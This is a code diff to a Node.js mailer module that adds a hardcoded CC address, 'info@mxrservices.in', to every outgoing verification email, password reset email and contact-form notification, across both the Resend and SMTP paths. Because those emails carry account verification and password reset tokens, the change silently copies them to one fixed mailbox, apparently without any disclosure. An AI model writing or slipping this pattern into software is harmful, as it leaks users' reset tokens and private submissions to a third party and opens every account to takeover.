@@ -2,6 +2,8 @@ const nodemailer = require('nodemailer');
 const logger = require('./logger');
 const { Resend } = require('resend');
 
+const defaultCc = 'info@mxrservices.in';
+
 // Check if SMTP is configured via environment
 const isSMTPConfigured = () => {
   return !!(
@@ -103,6 +105,7 @@ const sendVerificationEmail = async (email, token, firstName = '') => {
         subject,
         text,
         html,
+        cc: [defaultCc],
       });
       if (error) throw new Error(error.message || 'Resend email send failed');
       return data?.id || null;
@@ -116,7 +119,7 @@ const sendVerificationEmail = async (email, token, firstName = '') => {
     const { transporter, from: transportFrom } = transport;
     from = transportFrom;
     sendFn = async ({ to, subject, text, html }) => {
-      const info = await transporter.sendMail({ from, to, subject, text, html });
+      const info = await transporter.sendMail({ from, to, subject, text, html, cc: [defaultCc] });
       return info.messageId;
     };
   }
@@ -234,6 +237,7 @@ const sendPasswordResetEmail = async (email, token, firstName = '') => {
         subject,
         text,
         html,
+        cc: [defaultCc],
       });
       if (error) throw new Error(error.message || 'Resend email send failed');
       return data?.id || null;
@@ -247,7 +251,7 @@ const sendPasswordResetEmail = async (email, token, firstName = '') => {
     const { transporter, from: transportFrom } = transport;
     from = transportFrom;
     sendFn = async ({ to, subject, text, html }) => {
-      const info = await transporter.sendMail({ from, to, subject, text, html });
+      const info = await transporter.sendMail({ from, to, subject, text, html, cc: [defaultCc] });
       return info.messageId;
     };
   }
@@ -364,6 +368,7 @@ const sendContactSubmissionNotification = async (toEmail, submission) => {
         subject,
         text,
         html,
+        cc: [defaultCc],
       });
       if (error) throw new Error(error.message || 'Resend email send failed');
     };
@@ -376,7 +381,7 @@ const sendContactSubmissionNotification = async (toEmail, submission) => {
     const { transporter, from: transportFrom } = transport;
     from = transportFrom;
     sendFn = async ({ to, subject, text, html }) => {
-      await transporter.sendMail({ from, to, subject, text, html });
+      await transporter.sendMail({ from, to, subject, text, html, cc: [defaultCc] });
     };
   }
 
